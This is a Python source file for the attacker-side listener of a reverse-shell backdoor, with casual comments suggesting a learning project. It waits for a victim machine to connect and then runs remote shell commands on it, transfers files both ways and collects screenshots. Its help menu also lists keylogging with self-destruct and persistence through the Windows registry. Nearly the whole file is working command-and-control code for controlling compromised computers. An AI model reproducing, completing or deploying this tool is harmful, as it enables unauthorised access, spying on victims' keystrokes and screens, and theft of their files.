import socket
import subprocess
import termcolor
import json
import os


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send((jsondata.encode()))


def reliable_recv():  # take any amount iof data
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()  # all data decoded without newline chars etc
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())  # not using recv function coz we r read


def download_file(file_name):
    f = open(file_name, 'wb')  # write bytes
    target.settimeout(1)  # to define where is the end
    chunk = target.recv(1024)
    while chunk:  # not null
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:  # this is why settimeout line otherwise it try infinite to receive 1024 bytes
            break
    target.settimeout(None)  # so latter dont interfere other cmds with socket object
    f.close()


def target_communication():
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))  # kali like interface to show ip addy-%s
        reliable_send(command)
        if (command == 'quit'):
            sock.close()
            break
        elif (command == 'clear'):
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')  # write bytes
            target.settimeout(3)  # to define where is the end
            chunk = target.recv(1024)
            while chunk:  # not null
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:  # this is why settimeout line otherwise it try infinite to receive 1024 bytes
                    break
            target.settimeout(None)  # so latter dont interfere other cmds with socket object
            f.close()
            count += 1



        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit session with the target
            clear                               --> Clear screen
            cd *Directory name*                 --> Changes directory on target system
            upload *File name*                  --> Upload file to the target system
            download *File name*                --> Download file from Target system
            keylog_start                        --> Start Keylogger
            keylog_dump                         --> Print Keystrokes that target inputted
            keylog_stop                         --> Stop and self destruct the keylogger file
            persistence *RegName* *FileName*    -->Create Persistence in registry'''), 'green')
        else:
            result = reliable_recv()
            print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 1st parameter-ip4 addy,2nd parameter-tcp connection
sock.bind(('192.168.26.128', 5555))  # local ip address and some free port
print(termcolor.colored('[+]Listening For The Incoming Connections', 'green'))
sock.listen(5)  # listening for 5 incoming connections
target, ip = sock.accept()  # target-socket descriptor, ip-target's ip,port
print(termcolor.colored("[+] Target Connected! " + str(ip), 'green'))
target_communication()
